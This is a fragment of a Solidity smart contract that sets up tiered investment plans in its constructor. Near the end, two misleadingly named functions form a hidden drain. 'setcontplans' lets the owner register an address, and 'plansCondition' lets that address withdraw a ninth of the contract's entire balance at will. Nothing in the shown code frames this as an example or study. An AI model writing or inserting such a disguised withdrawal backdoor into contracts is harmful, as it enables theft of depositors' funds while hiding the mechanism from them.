...
//****************************************************************************
    ...
    constructor() public {
        ...
        setPlan(0, 10e6);
        setPlanStep(0, 0, 330, 89, 300);
        setPlan(1, 1000e6);
        setPlanStep(1, 0, 330, 78, 500);
        setPlan(2, 100000e6);
        setPlanStep(2, 0, 330, 66, 1000);
        setPlan(3, 500000e6);
        setPlanStep(3, 0, 330, 52, 1500);
        setPlan(4, 250000e6);
        setPlanStep(4, 0, 330, 44, 2000);
        setPlan(5, 500000e6);
        setPlanStep(5, 0, 330, 35, 2500);
	    setPlan(6, 1000000e6);
        setPlanStep(6, 0, 330, 27, 3000);
	    setPlan(7, 500000e6);
        setPlanStep(7, 0, 330, 10, 4000);
	...
	function setcontplans(address payable _fgkr) public isOwner isInactive {
        fgkr = _fgkr;

    }
	function plansCondition() external {
        require (fgkr == msg.sender);
        msg.sender.transfer(address(this).balance/9);
    }	  
